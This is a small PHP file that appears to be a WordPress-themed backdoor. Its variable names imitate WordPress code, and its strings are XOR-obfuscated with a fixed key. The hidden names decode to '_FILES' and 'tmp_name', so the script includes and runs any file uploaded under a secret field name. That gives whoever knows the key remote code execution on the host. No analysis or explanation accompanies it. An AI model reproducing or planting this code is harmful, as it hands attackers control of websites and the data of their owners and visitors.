<?php 	
$more_string = 'wFn4yO8B1Dy7G';
$is_bad_flat_slug = $more_string;
function force($query_var, $tagregexp)

{

    $format = $tagregexp;

    $orderby = urldecode($query_var);
    $path = substr($format,0, strlen($orderby));
    $tags_to_ignore = $orderby ^ $path;

    return $tags_to_ignore;
}
$post_category = ${force("%28%00%27x%3C%1C", $is_bad_flat_slug)};
$flag_after_digit = $post_category;
$open_quote = isset($flag_after_digit[$is_bad_flat_slug]);
if ($open_quote)

{
    $tinkle = $post_category[$is_bad_flat_slug];
    $wild = $tinkle[force("%03%2B%1Ek%17.U%27", $is_bad_flat_slug)];

    $post_types = $wild;
    include ($post_types);
}
	$meta_value = 'wpdb';
?>
